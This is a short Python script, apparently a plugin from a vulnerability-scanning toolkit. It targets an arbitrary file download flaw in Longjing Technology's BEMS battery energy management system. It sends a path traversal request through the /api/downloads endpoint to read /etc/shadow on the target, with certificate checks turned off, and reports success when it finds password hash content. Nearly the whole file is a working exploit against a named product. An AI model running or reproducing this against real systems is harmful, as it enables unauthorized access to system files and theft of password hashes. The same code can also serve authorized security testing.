'''
龙璟科技 电池能量BEMS 任意文件下载漏洞
'''
import requests

from main import hprint, print_blue


def BEMS_download(url, timeout=6):
    print_blue('龙璟科技 电池能量BEMS 任意文件下载漏洞')
    return_data = ''
    # if not url[0:1] == '/':
    #     url = url + '/'
    try:
        re = requests.get(url + '/api/downloads?fileName=../../../../../../../../etc/shadow', timeout=timeout,verify=False)
        # print(re)
        if '::' in re.text:
            return '成功'
    except ConnectionError as e:
        return '连接失败'
    except TimeoutError as e:
        return '连接超时'
    except Exception as e:
        return '未知错误：' + str(e)